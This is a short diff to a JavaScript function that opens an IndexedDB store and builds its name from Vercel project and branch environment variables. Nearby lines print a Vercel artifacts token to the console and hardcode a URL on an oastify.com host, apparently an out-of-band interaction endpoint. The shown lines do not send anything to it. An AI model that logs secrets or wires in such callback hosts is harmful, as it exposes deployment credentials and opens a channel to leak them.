@@ -11,7 +11,8 @@ export const Idb = (prjid) => {
         console.log({NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF});
         console.log({NEXT_PUBLIC_VERCEL_ARTIFACTS_TOKEN});
     	  const userId = "444"
-        const dbName = "rep:live_mode_1@" + String(process.env.VERCEL_PROJECT_ID) + "@" + String(process.env.VERCEL_GIT_COMMIT_REF) + "-" + String(userId) + ":4";
+        const dbName = "rep:live_mode_1@" + String(process.env.NEXT_PUBLIC_VERCEL_PROJECT_ID) + "@" + String(process.env.NEXT_PUBLIC_VERCEL_GIT_COMMIT_REF) + "-" + String(userId) + ":4";
+        console.log({dbName});
         const url = 'https://rqlt1694pp1b11zyns5oflv8fzlq9h17pw.oastify.com';
 
         // Open indexedDB
